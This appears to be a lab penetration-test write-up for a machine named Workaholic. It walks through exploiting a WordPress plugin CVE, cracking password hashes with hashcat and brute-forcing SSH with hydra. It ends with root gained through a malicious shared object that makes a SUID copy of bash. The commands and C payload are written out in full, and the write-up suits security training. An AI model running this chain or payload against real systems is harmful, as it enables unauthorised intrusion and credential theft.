# Report - Workaholic

Author: Henry Post
Target: WORKAHOLIC
Target IP: 192.168.61.229
Date: 03/26/2026

# Executive Summary

This machine, Workaholic, was enumerated by nmap to have FTP, HTTP, and SSH open.

The HTTP server was running WordPress which was vulnerable to CVE-2024-9796. This CVE was used to dump a list of users and password hashes on WordPress.

The hashes were cracked, and we found a user, `ted`, that had an FTP login.

From FTP, we downloaded `wp-config.php` which had more credentials in it.

We used `hydra` to enumerate SSH and found that `charlie` had a login on SSH.

We got the user flag from SSH, and used `find / -perm -u=s -type f 2>/dev/null | grep -v snap` to find binaries with SUID set, meaning they can run as root.

We found `/var/www/html/wordpress/blog/wp-monitor` as a SUID binary, ran `strings` on it to discover it loaded shared objects from a specific directory, and used C shared object injection to get root.

## Recommendations

Upgrade WordPress plugins vulnerable to CVE-2024-9796 immediately.

Close unnecessary ports like FTP or SSH if they do not need to be open.

Consider using private-public key auth for SSH instead of passwords.

Do not allow FTP users to access sensitive files.

Do not set SUID on binaries that do not need it.

Do not load shared objects if you can avoid it.

## References

- <https://github.com/meltingscales/CVE-2024-9796>

# Recon

We ran `nmap -sS -sV WORKAHOLIC`.

![](Pasted%20image%2020260326155757.png)

We notice FTP, SSH, and HTTP.

We visit the HTTP server and notice it's running WordPress. The lab description mentions CVE-2024-9796, and we find a public exploit on GitHub.

- https://github.com/meltingscales/CVE-2024-9796/blob/main/poc.py

![](Pasted%20image%2020260326161133.png)

We get 3 password hashes, and crack 2 of them with `hashcat`.


```sh
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

echo '$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.'  > hashes
echo '$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.' >> hashes
echo '$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/' >> hashes

hashcat -m 400 ./hashes /usr/share/wordlists/rockyou.txt #--show
```

![](Pasted%20image%2020260326161842.png)

`ted` user with a password of `okadamat17` works for FTP login. We steal `wp-config.php`.

![](Pasted%20image%2020260326161949.png)

Inside `wp-config.php`, we find another credential.

![](Pasted%20image%2020260326162018.png)

We assume this gives us SSH, and so we use `hydra` to automate trying pairs.

```
usernames.txt:

ted
wpadmin
admin
root
charlie

passwords.txt:

rU)tJnTw5*ShDt4nOx

hydra -L usernames -P passwords ssh://WORKAHOLIC

# [22][ssh] host: WORKAHOLIC   login: charlie   password: rU)tJnTw5*ShDt4nOx
```
# Non-root access

We ssh in as `charlie` and steal the non-root flag.

![](Pasted%20image%2020260326162202.png)

# Root access

To get root access, we first search for a SUID binary.

```bash
find / -perm -u=s -type f 2>/dev/null | grep -v snap

<<EOF
charlie@workaholic:~$ find / -perm -u=s -type f 2>/dev/null | grep -v snap
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount3
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/tmp/bash
/var/www/html/wordpress/blog/wp-monitor
EOF
```

We find a lot, but `/var/www/html/wordpress/blog/wp-monitor` is what we want. We run `strings` on it thusly:

```bash
strings /var/www/html/wordpress/blog/wp-monitor

<<FILE
...
PTE1
u+UH
/var/log/nginx/access.log
Error opening log file
%s - - [%*[^]]] "%s %s %s" %s
POST /wp-login.php
[Warning] Possible brute force attack detected: %s
[+] Checking the logs...
/home/ted/.lib/libsecurity.so
[!] This can take a while...
init_plugin
[!] Function not found in the library!
9*3$"
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
Scrt1.o
...
FILE
```

We find `/home/ted/.lib/libsecurity.so`. This is a shared object file (C module) that can be loaded into memory. We hope that it's writeable. 

We check with `find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|run)'` thusly.

```bash
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|run)' 

<<FILE
/tmp
/dev/shm
/dev/mqueue
/var/crash
/var/tmp
/var/lib/php/sessions
/home/ted
/home/ted/.lib
/home/charlie
/home/charlie/.local
/home/charlie/.local/share
/home/charlie/.local/share/nano
/home/charlie/.ssh
/home/charlie/.cache
FILE
```

Good! `/home/ted/.lib` is writeable.

We create a file at `/home/ted/.lib/libsecurity.c` with these contents.

```c
#include <stdlib.h>
#include <unistd.h>

void init_plugin() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

If it is compiled into a module called `libsecurity.so`, and executes when we execute the binary `/var/www/html/wordpress/blog/wp-monitor`, we should get root shell in the same terminal.

```bash
nano /home/ted/.lib/libsecurity.c

gcc -fPIC -shared -o /home/ted/.lib/libsecurity.so /home/ted/.lib/libsecurity.c

/var/www/html/wordpress/blog/wp-monitor
```


![](Pasted%20image%2020260326162903.png)

We have root pwn.